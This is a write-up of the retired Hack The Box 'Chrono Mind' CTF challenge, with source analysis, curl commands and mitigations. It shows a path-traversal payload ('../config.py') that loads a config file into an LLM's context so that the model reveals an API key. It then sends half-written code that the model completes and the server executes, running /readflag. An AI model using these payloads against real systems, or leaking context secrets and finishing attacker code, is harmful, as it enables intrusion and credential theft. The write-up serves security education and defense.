---
challenge: Chrono Mind
category: Misc
type: Misc
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [misc, ai, lm, path-traversal, rce]
---

# Chrono Mind — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no real flags.

## TL;DR

A chatbot backed by a small model (`LaMini-Flan-T5-248M`) with two chained flaws. The `topic` parameter of `/api/create` is concatenated into a path without sanitising, so `../config.py` loads the configuration as context and the model reveals `copilot_key`. With that key, `/api/copilot/complete_and_run` executes code **together with the model's autocompletion**: write `os.system(cmd)` halfway and the model finishes it. Running `/readflag` yields the flag.

## Brief and surface

- Misc, Easy; Business CTF 2024.
- Ships the app source (`api.py`, `utils.py`, `config.py`) and a web instance.
- The story is an abandoned model that still holds secrets.

## Recon

```bash
curl -s -c cookies.txt http://<IP>:<PORT>/ | head
```

The site offers three topics: Weapon Systems, Location Intelligence and Communication Systems. Picking one makes the front end `POST /api/create` with `{"topic": "..."}` and receive a `room` cookie. Questions go to `POST /api/ask` with that cookie.

## Source analysis

```python
def getRepository(topic):
    for suffix in ['', '.md']:
        repoFile = f"{Config.knowledgePath}/{topic}{suffix}"
        if os.path.exists(repoFile):
            return readFile(repoFile)
    return None
```

- `knowledgePath` is `os.getcwd() + "/repository"`.
- `topic` is never normalised: `../config.py` resolves to `challenge/config.py` and `os.path.exists` accepts it.
- The content goes through `lm.store_doc(content)` and the model uses it as context when answering.

The copilot endpoint requires the key:

```python
@router.post("/copilot/complete_and_run")
def copilot_complete_and_run(response: Response, params: copilotParams):
    if Config.copilot_key != params.copilot_key:
        response.status_code = 403
        return {"message": "Invalid API key"}
    completion = lm.code(params.code)
    full_code = params.code + completion.strip()
    return {"completion": full_code, "result": evalCode(full_code)}
```

`evalCode` writes the code to a file and runs it with `python3` (10 s timeout).

## The bug

Two unsafe decisions add up: a path built from user input and an endpoint that **executes** model output. The first leaks the key; the second turns autocompletion into code execution. The 248M model writes little, but leaving it the last line is enough.

## Local reproduction

```bash
docker compose up --build
```

With the container, `curl` against `localhost` reproduces the full flow. The model takes a few seconds per answer; wait between requests.

## Exploitation

1. **Leak the configuration.** Create the room with the malicious topic:

```bash
curl -s -c c.txt -X POST http://<IP>:<PORT>/api/create \
  -H 'Content-Type: application/json' \
  -d '{"topic": "../config.py"}'
```

2. **Ask the model for the key.** On `/api/ask`, ask for the value of `copilot_key` in the context; the model returns it because it sits in the loaded document.

3. **Execute.** Call the copilot with incomplete code so the model finishes it:

```bash
curl -s -X POST http://<IP>:<PORT>/api/copilot/complete_and_run \
  -H 'Content-Type: application/json' \
  -d '{"copilot_key": "<key>", "code": "import os\ncmd = \"/readflag\"\n# run cmd with system\n"}'
```

The response carries `completion` (the final code) and `result` (the `/readflag` output).

Details: room creation is limited to one at a time (`Config.createProgress`), so wait between attempts; and `room` is a cookie, not a parameter.

## Evidence

- The `/api/create` response with `topic: ../config.py`.
- The model text containing the key.
- `/readflag` output in `result`; flag in `private/`.

## Lessons learned

- **Context is surface**: whatever is loaded as a document can be exfiltrated by asking.
- **`os.path.exists` does not validate**: it accepts `..`; use `os.path.realpath` and check the prefix.
- **The model completes, it does not decide**: leaving the call half-written makes it generate exactly the missing line.

## Mitigations and detection

- Normalise and confine the path: `realpath` plus a prefix check against `knowledgePath`.
- Never execute model-generated code; if autocompletion is offered, keep it text-only with no `eval`/`subprocess`.
- Keep keys outside the served tree and rotate after a leak.
- Detection: requests with `..` in `topic`, and `python3` processes spawned by the app with generated content.

## References

- <https://github.com/hackthebox/business-ctf-2024/tree/main/misc/%5BEasy%5D%20Chrono%20Mind>
- <https://jncraton.github.io/languagemodels/languagemodels.html>
- <https://owasp.org/www-community/attacks/Path_Traversal>
